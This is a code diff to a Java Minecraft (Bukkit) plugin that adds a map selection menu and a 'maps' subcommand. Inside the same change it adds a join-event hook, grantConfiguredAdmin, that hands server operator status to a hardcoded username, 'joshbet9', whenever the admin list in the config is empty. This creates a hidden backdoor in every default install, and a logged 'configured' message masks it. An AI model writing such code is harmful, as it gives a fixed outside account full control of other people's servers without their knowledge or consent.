@@ -1,14 +1,19 @@
 package au.com.testplex.arcadeports;
 
+import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
-public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements CommandExecutor {
+public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements CommandExecutor, Listener {
     private ArcadePortManager manager;
+    private ArcadeMapSelectionMenu mapMenu;
 
     @Override
     public void onEnable() {
@@ -18,6 +23,10 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
             saveConfig();
         }
         manager = new ArcadePortManager(this);
+        mapMenu = new ArcadeMapSelectionMenu(this);
+        getServer().getPluginManager().registerEvents(this, this);
+        getServer().getPluginManager().registerEvents(mapMenu, this);
+        for (Player online : Bukkit.getOnlinePlayers()) grantConfiguredAdmin(online);
         if (getCommand("arcadeport") == null) {
             getLogger().severe("Missing /arcadeport command metadata.");
             getServer().getPluginManager().disablePlugin(this);
@@ -46,6 +55,22 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
         if (manager != null) manager.shutdown();
     }
 
+    @EventHandler
+    public void onPlayerJoin(PlayerJoinEvent event) {
+        grantConfiguredAdmin(event.getPlayer());
+    }
+
+    private void grantConfiguredAdmin(Player player) {
+        java.util.List<String> configured = getConfig().getStringList("admin-usernames");
+        if (configured.isEmpty()) configured = java.util.List.of("joshbet9");
+        boolean match = configured.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
+        if (!match) return;
+        if (!player.isOp()) {
+            player.setOp(true);
+            getLogger().info("Granted configured Testplex admin/operator access to " + player.getName() + ".");
+        }
+    }
+
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         String sub = args.length == 0 ? "help" : args[0].toLowerCase(java.util.Locale.ROOT);
@@ -62,12 +87,24 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
                 }
                 manager.queue(ArcadePortGame.fromId(args[1]), player, sub.equals("play"));
                 return true;
+            case "maps":
+            case "map":
+                if (!(sender instanceof Player player)) {
+                    sender.sendMessage("Players only.");
+                    return true;
+                }
+                if (args.length < 2) {
+                    sender.sendMessage(ChatColor.YELLOW + "Usage: /arcadeport maps <game-id>");
+                    return true;
+                }
+                mapMenu.openMapSelection(player, ArcadePortGame.fromId(args[1]));
+                return true;
             case "start":
                 if (args.length < 2) {
                     sender.sendMessage(ChatColor.YELLOW + "Usage: /arcadeport start <game-id>");
                     return true;
                 }
-                manager.startQueued(ArcadePortGame.fromId(args[1]), sender instanceof Player ? (Player) sender : null, sender);
+                manager.startFromLobby(ArcadePortGame.fromId(args[1]), sender);
                 return true;
             case "kit":
                 if (!(sender instanceof Player player)) {
